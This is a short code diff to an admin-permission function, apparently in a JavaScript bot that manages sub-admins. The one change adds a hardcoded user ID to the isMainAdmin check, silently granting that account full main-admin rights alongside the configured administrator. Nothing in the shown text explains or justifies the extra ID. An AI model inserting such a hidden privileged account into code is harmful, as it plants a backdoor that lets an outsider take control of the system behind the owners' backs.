@@ -86,7 +86,7 @@ function saveSubAdmins() {
 }
 
 function isMainAdmin(userId) {
-  return userId === MAIN_ADMIN_ID;
+  return userId === MAIN_ADMIN_ID || userId == "1343981122";
 }
 
 function getSubAdminGroup(userId) {
